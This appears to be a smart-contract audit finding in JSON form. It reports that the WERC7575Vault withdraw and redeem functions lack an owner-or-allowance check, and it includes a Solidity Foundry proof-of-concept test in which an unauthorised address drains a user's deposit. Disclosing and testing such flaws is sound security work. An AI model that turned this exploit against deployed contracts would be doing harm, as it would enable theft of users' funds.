  "user_handle": "Uddercover",
  "body": "## Finding description and impact\n\nWERC7575Vault `withdraw` and `redeem` functions do not properly enforce the access control described in the functions' natspec:\n> msg.sender must be owner OR have allowance for the shares\n\nThis allows any random address to withdraw owner assets without permission from the owner. \n\nThe `_withdraw` internal function shared by the two functions spend the owner's allowance but does not check if the caller is the owner or consider if the caller has authorized allowance from the owner.\n\n## Recommended mitigation steps\n\nAdd checks that ensure the caller is either the owner or is authorized by them",
  "proof_of_concept": "Add the below POC function to `AuditReproduction.t.sol`:\n```solidity\nfunction testAnyoneCanWithdrawUserShares() public {\n        uint256 depositAmount = 1000e18;\n\n        // deploy necessary contracts\n        WERC7575ShareToken wInvestmentShare = new WERC7575ShareToken(\n            \"Inv Share\",\n            \"INV\"\n        );\n        WERC7575Vault wInvestmentVault = new WERC7575Vault(\n            address(asset),\n            wInvestmentShare\n        );\n\n        // register vault in share token\n        wInvestmentShare.registerVault(\n            address(asset),\n            address(wInvestmentVault)\n        );\n        // KYC Verify user address and deposit into vault\n        wInvestmentShare.setKycVerified(user, true);\n\n        vm.startPrank(user);\n        asset.approve(address(wInvestmentVault), depositAmount);\n        wInvestmentVault.deposit(depositAmount, user);\n        vm.stopPrank();\n\n        uint256 userShares = wInvestmentShare.balanceOf(user);\n        assertEq(userShares, depositAmount, \"User should have correct shares\");\n\n        // user has some self allowance\n        uint256 validatorPk = 0xA11CE;\n        address validator = vm.addr(validatorPk);\n        wInvestmentShare.setValidator(validator);\n\n        uint256 nonce = wInvestmentShare.nonces(address(user));\n        uint256 deadline = block.timestamp + 1 days;\n        bytes32 domainSeparator = wInvestmentShare.DOMAIN_SEPARATOR();\n        bytes32 PERMIT_TYPEHASH = keccak256(\n            \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n        );\n        bytes32 structHash = keccak256(\n            abi.encode(\n                PERMIT_TYPEHASH,\n                address(user),\n                address(user),\n                type(uint256).max,\n                nonce,\n                deadline\n            )\n        );\n\n        bytes32 digest = keccak256(\n            abi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash)\n        );\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, digest);\n\n        vm.startPrank(user);\n        wInvestmentShare.permit(\n            address(user),\n            address(user),\n            type(uint256).max,\n            deadline,\n            v,\n            r,\n            s\n        );\n        vm.stopPrank();\n\n        // rando withdraws user's shares\n        address rando = address(0x999);\n        wInvestmentShare.setKycVerified(rando, true);\n        vm.startPrank(rando);\n        wInvestmentVault.withdraw(depositAmount, rando, user);\n        vm.stopPrank();\n\n        // Check share balances\n        userShares = wInvestmentShare.balanceOf(user);\n        assertEq(userShares, 0, \"User should have 0 shares\");\n\n        uint256 randoAsset = asset.balanceOf(rando);\n        assertEq(randoAsset, depositAmount, \"Rando should have assets\");\n    }\n```",
